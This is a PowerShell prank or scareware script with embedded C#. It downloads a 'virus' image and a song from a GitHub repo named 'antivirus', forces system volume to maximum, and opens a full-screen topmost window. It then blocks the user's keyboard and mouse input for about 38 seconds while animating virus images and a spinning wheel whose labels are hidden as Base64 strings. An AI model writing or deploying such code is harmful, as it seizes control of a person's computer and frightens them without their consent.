Add-Type -AssemblyName System.Windows.Forms,System.Drawing
[System.Windows.Forms.Application]::EnableVisualStyles()

Add-Type -TypeDefinition @"
using System;
using System.Drawing;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Collections.Generic;

public class GamePanel : Panel {
    public GamePanel() {
        this.DoubleBuffered = true;
        this.SetStyle(
            ControlStyles.AllPaintingInWmPaint |
            ControlStyles.UserPaint |
            ControlStyles.OptimizedDoubleBuffer,
            true);
    }
}

public class MCI {
    [DllImport("winmm.dll", CharSet = CharSet.Auto)]
    public static extern int mciSendString(string c, System.Text.StringBuilder r, int l, IntPtr h);
    public static void Play(string p) {
        mciSendString("open \"" + p + "\" type mpegvideo alias snd", null, 0, IntPtr.Zero);
        mciSendString("play snd", null, 0, IntPtr.Zero);
    }
    public static void Stop() {
        mciSendString("stop snd", null, 0, IntPtr.Zero);
        mciSendString("close snd", null, 0, IntPtr.Zero);
    }
}

public class InputBlocker {
    [DllImport("user32.dll")]
    public static extern bool BlockInput(bool block);
    public static void Block()   { BlockInput(true);  }
    public static void Unblock() { BlockInput(false); }
}

public class AudioHelper {
    [DllImport("winmm.dll")]
    public static extern int waveOutSetVolume(IntPtr h, uint vol);
    public static void MaxVolume() { waveOutSetVolume(IntPtr.Zero, 0xFFFFFFFF); }
}

// Мини-вирусы — чисто данные, без PictureBox
public class MiniVirus {
    public double X, Y, Size, Angle, Speed, OrbitX, OrbitY, CX, CY;
}
"@ -ReferencedAssemblies System.Windows.Forms,System.Drawing

# ── Загрузка ресурсов ──────────────────────────────────────────────────────────
$script:imgPath  = "$env:TEMP\virus_img.png"
$script:songPath = "$env:TEMP\vashsin_snd.mp3"

try {
    iwr "https://raw.githubusercontent.com/sweetvata/antivirus/main/virus.png" `
        -OutFile $script:imgPath -UseBasicParsing -ErrorAction Stop
} catch {
    [System.Windows.Forms.MessageBox]::Show("Не удалось скачать virus.png: $_","Ошибка",
        [System.Windows.Forms.MessageBoxButtons]::OK,[System.Windows.Forms.MessageBoxIcon]::Error)
    exit 1
}
try {
    iwr "https://raw.githubusercontent.com/sweetvata/antivirus/main/vashsin.mp3" `
        -OutFile $script:songPath -UseBasicParsing -ErrorAction Stop
} catch {
    [System.Windows.Forms.MessageBox]::Show("Не удалось скачать vashsin.mp3: $_","Ошибка",
        [System.Windows.Forms.MessageBoxButtons]::OK,[System.Windows.Forms.MessageBoxIcon]::Error)
    exit 1
}

$script:virusImg = [System.Drawing.Image]::FromFile($script:imgPath)
[MCI]::Play($script:songPath)
[AudioHelper]::MaxVolume()

# ── Конфигурация колеса ────────────────────────────────────────────────────────
$script:REST  = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('0KDQldCh0KI='))
$script:NREST = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('0J3QldCg0JXQodCi'))

$script:lbl = @(
    $script:REST,$script:REST,$script:REST,$script:REST,$script:NREST,
    $script:REST,$script:REST,$script:REST,$script:REST,$script:NREST
)
$script:clr = @(
    [System.Drawing.Color]::FromArgb(50,180,50),
    [System.Drawing.Color]::FromArgb(80,200,80),
    [System.Drawing.Color]::FromArgb(50,180,50),
    [System.Drawing.Color]::FromArgb(80,200,80),
    [System.Drawing.Color]::FromArgb(220,50,50),
    [System.Drawing.Color]::FromArgb(50,180,50),
    [System.Drawing.Color]::FromArgb(80,200,80),
    [System.Drawing.Color]::FromArgb(50,180,50),
    [System.Drawing.Color]::FromArgb(80,200,80),
    [System.Drawing.Color]::FromArgb(200,40,40)
)
$script:N      = 10
$script:sweep  = 36.0
$script:a      = 0.0
$script:ticks  = 0
$script:stopped = $false
$script:result  = ''
$script:pulse   = 0.0

# ── Данные змейки ──────────────────────────────────────────────────────────────
$script:snakeStep = 90
$script:snakeIdx  = 0
$script:snakePositions = [System.Collections.Generic.List[System.Drawing.Point]]::new()
# Дёргание: каждой плитке случайное смещение которое меняется
$script:jitterX = [System.Collections.Generic.List[int]]::new()
$script:jitterY = [System.Collections.Generic.List[int]]::new()

# ── Мини-вирусы (чистые данные, без PictureBox) ───────────────────────────────
$script:miniViruses = [System.Collections.Generic.List[MiniVirus]]::new()

$rng = New-Object System.Random

# ── Форма ──────────────────────────────────────────────────────────────────────
$script:form = New-Object System.Windows.Forms.Form
$script:form.WindowState     = 'Maximized'
$script:form.FormBorderStyle = 'None'
$script:form.TopMost         = $true
$script:form.BackColor       = 'Black'

$script:panel = New-Object GamePanel
$script:panel.Dock      = 'Fill'
$script:panel.BackColor = 'Black'
$script:form.Controls.Add($script:panel)

# ── Построить позиции: два потока из противоположных углов ────────────────────
function Build-SnakeGrid {
    $W = $script:panel.Width; $H = $script:panel.Height
    $step = $script:snakeStep
    $script:snakePositions.Clear()
    $script:jitterX.Clear()
    $script:jitterY.Clear()

    $cols = [int]([Math]::Ceiling($W / $step)) + 1
    $rows = [int]([Math]::Ceiling($H / $step)) + 1

    # Поток A: из левого верхнего угла, диагонали col+row=const
    $streamA = [System.Collections.Generic.List[System.Drawing.Point]]::new()
    for ($diag = 0; $diag -lt ($cols+$rows-1); $diag++) {
        for ($col = [Math]::Max(0,$diag-$rows+1); $col -le [Math]::Min($diag,$cols-1); $col++) {
            $row = $diag - $col
            $streamA.Add([System.Drawing.Point]::new($col*$step, $row*$step))
        }
    }

    # Поток B: из правого нижнего угла — зеркально
    $streamB = [System.Collections.Generic.List[System.Drawing.Point]]::new()
    for ($diag = 0; $diag -lt ($cols+$rows-1); $diag++) {
        for ($col = [Math]::Max(0,$diag-$rows+1); $col -le [Math]::Min($diag,$cols-1); $col++) {
            $row = $diag - $col
            # Зеркалим: правый нижний угол
            $streamB.Add([System.Drawing.Point]::new(($cols-1-$col)*$step, ($rows-1-$row)*$step))
        }
    }

    # Чередуем A и B
    $maxLen = [Math]::Max($streamA.Count, $streamB.Count)
    for ($i = 0; $i -lt $maxLen; $i++) {
        if ($i -lt $streamA.Count) {
            $script:snakePositions.Add($streamA[$i])
            $script:jitterX.Add(0)
            $script:jitterY.Add(0)
        }
        if ($i -lt $streamB.Count) {
            $script:snakePositions.Add($streamB[$i])
            $script:jitterX.Add(0)
            $script:jitterY.Add(0)
        }
    }
}

# ── Добавить мини-вирусы на орбиту ────────────────────────────────────────────
function Add-MiniViruses($count, $speedMult) {
    $W = $script:panel.Width; $H = $script:panel.Height
    $cxF = [double]($W/2); $cyF = [double]($H/2)
    $baseSpd = [double](8.0 * 2.0 * [Math]::PI / (18000.0/16.0))
    for ($i = 0; $i -lt $count; $i++) {
        $mv = New-Object MiniVirus
        $mv.Size   = $rng.Next(45, 75)
        $mv.OrbitX = [double]($rng.Next(100, [int]($W*0.46)))
        $mv.OrbitY = [double]($rng.Next(80,  [int]($H*0.46)))
        $mv.Angle  = [double]($rng.NextDouble() * 2 * [Math]::PI)
        $mv.Speed  = [double]($baseSpd * $speedMult * (0.8 + $rng.NextDouble()*0.4))
        if ($rng.Next(2) -eq 0) { $mv.Speed = -$mv.Speed }
        $mv.CX = $cxF; $mv.CY = $cyF
        $script:miniViruses.Add($mv)
    }
}

# ── Paint: всё рисуем сами, слои по порядку ───────────────────────────────────
$script:panel.Add_Paint({
    param($s, $e)
    $g = $e.Graphics
    $g.SmoothingMode     = 'AntiAlias'
    $g.TextRenderingHint = 'AntiAlias'
    $W = $script:panel.Width; $H = $script:panel.Height

    # 1. Чёрный фон
    $g.Clear([System.Drawing.Color]::Black)

    # 2. Вирусы-змейка с дёрганием
    $step  = $script:snakeStep
    $count = [Math]::Min($script:snakeIdx, $script:snakePositions.Count)
    for ($i = 0; $i -lt $count; $i++) {
        $pt = $script:snakePositions[$i]
        $jx = if ($i -lt $script:jitterX.Count) { $script:jitterX[$i] } else { 0 }
        $jy = if ($i -lt $script:jitterY.Count) { $script:jitterY[$i] } else { 0 }
        $g.DrawImage($script:virusImg, $pt.X + $jx, $pt.Y + $jy, $step, $step)
    }

    # 3. Колесо поверх
    $r  = [int]([Math]::Min($W,$H) * 0.26)
    $cx = [int]($W/2); $cy = [int]($H/2)
    $x  = $cx-$r; $y = $cy-$r; $d = $r*2

    $sh = New-Object System.Drawing.SolidBrush([System.Drawing.Color]::FromArgb(130,0,0,0))
    $g.FillEllipse($sh,$x+8,$y+8,$d,$d); $sh.Dispose()

    for ($n=0; $n -lt $script:N; $n++) {
        $br = New-Object System.Drawing.SolidBrush($script:clr[$n])
        $g.FillPie($br,$x,$y,$d,$d,[float]($script:a+$n*$script:sweep),[float]$script:sweep)
        $br.Dispose()
    }
    $wp = New-Object System.Drawing.Pen([System.Drawing.Color]::White,[float]2)
    for ($n=0; $n -lt $script:N; $n++) {
        $g.DrawPie($wp,$x,$y,$d,$d,[float]($script:a+$n*$script:sweep),[float]$script:sweep)
    }
    $wp.Dispose()
    $wp2 = New-Object System.Drawing.Pen([System.Drawing.Color]::White,[float]5)
    $g.DrawEllipse($wp2,$x,$y,$d,$d); $wp2.Dispose()

    $fn = New-Object System.Drawing.Font('Arial',11,[System.Drawing.FontStyle]::Bold)
    $sf = New-Object System.Drawing.StringFormat
    $sf.Alignment = 'Center'; $sf.LineAlignment = 'Center'
    $tb = New-Object System.Drawing.SolidBrush([System.Drawing.Color]::White)
    $ts = New-Object System.Drawing.SolidBrush([System.Drawing.Color]::FromArgb(150,0,0,0))
    for ($n=0; $n -lt $script:N; $n++) {
        $ma = ($script:a+$n*$script:sweep+$script:sweep/2)*[Math]::PI/180
        $tx = [float]($cx+[Math]::Cos($ma)*$r*0.68)
        $ty = [float]($cy+[Math]::Sin($ma)*$r*0.68)
        $g.DrawString($script:lbl[$n],$fn,$ts,$tx+1,$ty+1,$sf)
        $g.DrawString($script:lbl[$n],$fn,$tb,$tx,$ty,$sf)
    }
    $fn.Dispose(); $sf.Dispose(); $tb.Dispose(); $ts.Dispose()

    $cr = [int]($r*0.10)
    $cb = New-Object System.Drawing.SolidBrush([System.Drawing.Color]::White)
    $g.FillEllipse($cb,$cx-$cr,$cy-$cr,$cr*2,$cr*2); $cb.Dispose()

    $as = [float]($r*0.14)
    $pts = @(
        [System.Drawing.PointF]::new([float]$cx,           [float]($cy+$r-$as*0.5)),
        [System.Drawing.PointF]::new([float]($cx-$as*0.7), [float]($cy+$r+$as*0.8)),
        [System.Drawing.PointF]::new([float]($cx+$as*0.7), [float]($cy+$r+$as*0.8))
    )
    $ab = New-Object System.Drawing.SolidBrush([System.Drawing.Color]::FromArgb(255,220,0))
    $ap = New-Object System.Drawing.Pen([System.Drawing.Color]::FromArgb(180,140,0),[float]2)
    $g.FillPolygon($ab,$pts); $g.DrawPolygon($ap,$pts)
    $ab.Dispose(); $ap.Dispose()

    # 4. Мини-вирусы поверх колеса
    foreach ($mv in $script:miniViruses) {
        $nx = [int]($mv.CX + [Math]::Cos($mv.Angle)*$mv.OrbitX - $mv.Size/2)
        $ny = [int]($mv.CY + [Math]::Sin($mv.Angle)*$mv.OrbitY - $mv.Size/2)
        $g.DrawImage($script:virusImg, $nx, $ny, [int]$mv.Size, [int]$mv.Size)
    }

    # 5. Результат — поверх ВСЕГО (включая мини-вирусы)
    if ($script:stopped) {
        $psize = [float](120.0 + 40.0 * [Math]::Sin($script:pulse))
        $rfn = New-Object System.Drawing.Font('Arial', $psize, [System.Drawing.FontStyle]::Bold)
        $rsf = New-Object System.Drawing.StringFormat
        $rsf.Alignment = 'Center'; $rsf.LineAlignment = 'Center'
        $rrc = New-Object System.Drawing.RectangleF(0, 0, [float]$W, [float]$H)
        $rbg = New-Object System.Drawing.SolidBrush([System.Drawing.Color]::FromArgb(120,0,0,0))
        $g.FillRectangle($rbg, $rrc); $rbg.Dispose()
        $rsh = New-Object System.Drawing.SolidBrush([System.Drawing.Color]::FromArgb(180,0,0,0))
        $g.DrawString($script:result, $rfn, $rsh,
            [System.Drawing.RectangleF]::new(8, 8, [float]$W, [float]$H), $rsf)
        $rsh.Dispose()
        $rtb = New-Object System.Drawing.SolidBrush([System.Drawing.Color]::FromArgb(255,230,0,0))
        $g.DrawString($script:result, $rfn, $rtb, $rrc, $rsf)
        $rfn.Dispose(); $rsf.Dispose(); $rtb.Dispose()
    }
})

# ── Главный таймер ─────────────────────────────────────────────────────────────
$t1 = New-Object System.Windows.Forms.Timer
$t1.Interval = 16
$t1.Add_Tick({
    $script:ticks++
    $ms = $script:ticks * 16

    # Змейка: 4 плитки за тик
    if ($ms -le 20000 -and $script:snakeIdx -lt $script:snakePositions.Count) {
        $script:snakeIdx += 4
    }

    # Дёргание: каждые 3 тика обновляем jitter для всех видимых плиток
    if ($script:ticks % 3 -eq 0) {
        $visible = [Math]::Min($script:snakeIdx, $script:jitterX.Count)
        for ($i = 0; $i -lt $visible; $i++) {
            $script:jitterX[$i] = $rng.Next(-6, 7)
            $script:jitterY[$i] = $rng.Next(-6, 7)
        }
    }

    # Мини-вирусы: обновить орбиты
    foreach ($mv in $script:miniViruses) {
        $mv.Angle += $mv.Speed
    }

    # Колесо
    if (-not $script:stopped) {
        if ($ms -lt 10000) {
            $script:a = ($script:a + 12) % 360
        } elseif ($ms -lt 20000) {
            $prog = ($ms - 10000) / 10000.0
            $script:a = ($script:a + (12*(1-$prog) + 0.5*$prog)) % 360
        }
    }

    # Пульсация
    if ($script:stopped) {
        $script:pulse = ($script:pulse + 0.12) % ([Math]::PI * 2)
    }

    $script:panel.Invalidate()
})

# ── tStop ──────────────────────────────────────────────────────────────────────
$tStop = New-Object System.Windows.Forms.Timer
$tStop.Interval = 20000
$tStop.Add_Tick({
    $tStop.Stop()
    $script:stopped = $true
    $norm = ((90 - $script:a) % 360 + 360) % 360
    $idx  = [int]([Math]::Floor($norm / $script:sweep)) % $script:N
    $script:result = $script:lbl[$idx]
    Add-MiniViruses 200 5.0
})

# ── tClose ─────────────────────────────────────────────────────────────────────
$tClose = New-Object System.Windows.Forms.Timer
$tClose.Interval = 38000
$tClose.Add_Tick({
    $t1.Stop(); $tStop.Stop(); $tClose.Stop()
    [InputBlocker]::Unblock()
    [MCI]::Stop()
    $script:form.Close()
})

# ── Запуск ─────────────────────────────────────────────────────────────────────
$script:form.Add_Shown({
    [InputBlocker]::Block()
    Build-SnakeGrid
    $t1.Start()
    $tStop.Start()
    $tClose.Start()
})

[void]$script:form.ShowDialog()
